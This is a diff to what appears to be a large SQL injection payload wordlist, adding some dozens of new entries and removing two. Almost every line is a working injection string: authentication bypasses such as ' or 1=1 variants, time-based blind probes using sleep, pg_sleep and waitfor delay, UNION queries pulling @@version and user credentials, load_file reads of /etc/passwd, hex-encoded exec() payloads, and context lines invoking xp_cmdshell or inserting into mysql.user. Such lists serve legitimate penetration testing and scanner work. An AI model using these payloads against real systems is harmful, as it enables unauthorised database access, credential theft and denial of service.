@@ -1,4 +1,5 @@
   or 1=1 --
+ 0 or 1=1
  and 0=benchmark(3000000,MD5(1)) --
  and 0=benchmark(3000000,MD5(1)) /*
  and 0=benchmark(3000000,MD5(1)) #
@@ -73,6 +74,7 @@
  or a=a
  or a=a--
  or benchmark(10000000,MD5(1))#
+ or isNULL(1/0) /*
  or pg_sleep(__TIME__)--
  or sleep(__TIME__)#
  or sleep(__TIME__)='
@@ -1093,6 +1095,7 @@
 .
 '
 ' --
+' -- &password=
 ' –
 ' ;
 ' ; drop table temp --
@@ -1127,7 +1130,9 @@
 ' and 0=benchmark(3000000,MD5(1))%20/*
 ' and 0=benchmark(3000000,MD5(1))%20%23
 ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+' and 1 in (select var from temp)--
 ' and 1='1
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
 ' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
 ' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
 ' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
@@ -1216,6 +1221,7 @@
 ' group by password having 1=1--
 ' group by userid having 1=1--
 ' group by username having 1=1--
+' having 1=1--
 ' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
 ' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
 ' or         0=0 #
@@ -1235,10 +1241,17 @@
 ' or '1'='1'#
 ' or '1′='1
 ' or '1�?'1
+' or '7659'='7659
 ' or 'a'='a
 ' or 'one'='one
 ' or 'one'='one–
 ' or 'one'='one�?' or uid like '%
+' or 'something' = 'some'+'thing'
+' or 'something' like 'some%'
+' or 'text' = n'text'
+' or 'text' > 't'
+' or 'unusual' = 'unusual'
+' or 'whatever' in ('whatever')
 ' or 'x'='x
 ' OR 'x'='x
 ‘ or ‘x’='x
@@ -1256,13 +1269,17 @@
 ' or 0=0 �?" or 0=0 --
 ' OR 1 -- -
 ' or 1 --'
+' or 1 in (select @@version)--
 ' or 1 or '
 ' or 1]%00
+' or 1/*
 ' or 1=1
 ' or 1=1 --
+‘ or 1=1 --
 ' OR 1=1 --+
 ' or 1=1 –
 ‘ or 1=1 –
+' or 1=1 /*
 ' or 1=1 limit 1 -- -+
 ' or 1=1 limit 1-- -+
 ' or 1=1 LIMIT 1;#
@@ -1280,10 +1297,13 @@
 ' or 1337=(select 1337 from pg_sleep(120)) -- 
 ' or 1337=dbms_pipe.receive_message(('a'),120) -- 
 ' or 1337=dbms_pipe.receive_message(1,120) -- 
+' or 2 > 1
+' or 2 between 1 and 3
 ' or 20<94 -- 
 ' or 20=20 -- 
 ' or 3=3
 ' or 3=3 --
+‘ or 3=3 --
 ' or a=a--
 ' or a=a–
 ‘ or a=a–
@@ -1307,11 +1327,14 @@
 ' or user like '%
 ' or userid like '%
 ' or username like '%
+' or username like char(37);
 ' RLIKE SLEEP(5) AND '1337' LIKE '1337
 ' RLIKE SLEEP(5) AND '1337'='1337
 ' RLIKE SLEEP(5) OR '1337'='1337
 ' RLIKE SLEEP(5)--
 ' RLIKE SLEEP(5)-- 1337
+' select * from information_schema.tables--
+' select name from syscolumns where id = (select id from sysobjects where name = tablename')--
 ' SELECT pg_sleep(5);
 ' SELECT SLEEP(10); #
 ' SELECT SLEEP(5); #
@@ -1362,6 +1385,7 @@
 ' union all select (select 1337 from pg_sleep(120)),null,null,null,null,null,null,null -- 
 ' union all select (select 1337 from pg_sleep(120)),null,null,null,null,null,null,null,null -- 
 ' union all select (select 1337 from pg_sleep(120)),null,null,null,null,null,null,null,null,null -- 
+' union all select @@version--
 ' UNION ALL SELECT 1, @@version;#
 ' union all select 1337 -- 
 ' union all select 1337 from dual -- 
@@ -1677,6 +1701,8 @@
 ' union all select sleep(120),null,null,null,null,null,null,null,null,null -- 
 ' UNION ALL SELECT system_user(),user();#
 ' UNION SELECT
+' union select 
+' union select * from users where login = char(114,111,111,116);
 ' UniON SElecT 1,2-- 2
 ' UniON SElecT 1,2,3-- 2
 ' UniON SElecT 1,2,3,4-- 2
@@ -1689,6 +1715,7 @@
 ' UnION SELeCT 1,2,3`
 ' UniON SElecT 1,2#
 ' UnION SELeCT 1,2`
+' union select 1,load_file('/etc/passwd'),1,1,1;
 ' UNION SELECT sum(columnname ) from tablename --
 ' UNION select table_schema,table_name FROM information_Schema.tables;#
 ' waitfor delay '0:0:__TIME__' --
@@ -1753,10 +1780,13 @@
 ',NULL)%20waifor%20delay%20'0:0:20'%20/*
 ',NULL)%20waitfor%20delay%20'0:0:20'%20--
 ';
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
+'; exec ('sel' + 'ect us' + 'er')
 '; exec master..xp_cmdshell
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
 '; exec xp_regread
+'; execute immediate 'sel' || 'ect us' || 'er'
 '; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:__TIME__' -- 
 '; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --
 '; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
@@ -2132,6 +2162,7 @@
 '/*
 '/**/or/**/''='
 '/**/or/**/'2'>'1
+'/**/or/**/1/**/=/**/1
 '/**/or/**/2>1--/**/
 '/**/or/**/2>1#
 '/**/UnIon/**/SeLect/**/1,1,1/**/from/**/admin/**/Where/**/''='
@@ -2191,6 +2222,7 @@
 '+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
 '+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
 '+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+'+sqlvuln
 '='
 '=' 'or'
 '=' 'or' and '=' 'or'
@@ -2209,10 +2241,12 @@
 '||'2'LiKE'2'/*
 '||'2'LiKE'2'#
 '||'2'LiKE'2'||'
+'||'6
 '||(2)LiKE(2)-- 2
 '||(2)LiKE(2)/*
 '||(2)LiKE(2)#
 '||(2)LiKE(2)||'
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
 '||(SELECT 0x4c454f67 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||'
 '||(SELECT 0x727a5277 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||'
 '||2-- 2
@@ -2337,6 +2371,7 @@
 'oR/**/true#
 'or1=1--
 'sqlattempt1
+'sqlvuln
 'UniON(SElecT(1),2,3,4,5)-- 2
 'UniON(SElecT(1),2,3,4,5)#
 'UniON(SElecT(1),2,3,4)-- 2
@@ -23593,8 +23628,11 @@
 0x0d0asleep(120)
 0x0d0asleep(120) -- 
 0x730065006c0065006300740020004000400076006500 ...
+0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
 0x770061006900740066006F0072002000640065006C00 ...
+0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A
 0x77616974666F722064656C61792027303A303A313027 ...
+0x77616974666F722064656C61792027303A303A31302700 exec(@s)
 1
 1 +  (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
 1 +  (SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
@@ -23683,6 +23721,7 @@
 1; SELECT SLEEP(5);--
 1; WAITFOR DELAY '0:0:5';--
 1;(load_file(char(47,101,116,99,47,112,97,115, ...
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
 1;SELECT IF((8303>8302),SLEEP(13),2356)#
 1;SELECT%20*
 1' AND (SELECT 6268 FROM (SELECT(SLEEP(10)))ghXo) AND 'IKlK'='IKlK
@@ -24154,6 +24193,7 @@ declare @q nvarchar (4000) select @q =
 declare @s varchar (200) select @s = 0x73656c6 ...
 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
 declare @s varchar (8000) select @s = 0x73656c ...
+declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e
 declare @s varchar(200) select @s = 0x77616974 ...
 declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
 declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
@@ -24213,6 +24253,7 @@ if(now()=sysdate(),sleep(9),0)/'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(no
 if(now()=sysdate(),sleep(xx),0)
 if(now()=sysdate()%2Csleep(15)%2C0)
 IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/
+index.aspx?page=select 1&page=2,3 from table where id=1
 insert
 like
 like '%'
@@ -24901,5 +24942,3 @@ X'XOR(if(now()=sysdate(),/**/sleep(5)/**/,0))XOR'X
 X'XOR(if(now()=sysdate(),//sleep(10)//,0))XOR'X
 XOR(if(now()=sysdate(),sleep(7),0))XOR%23
 xx49236287'%20or%208896=8896--
-ý or 1=1 --
-ý or 3=3 --
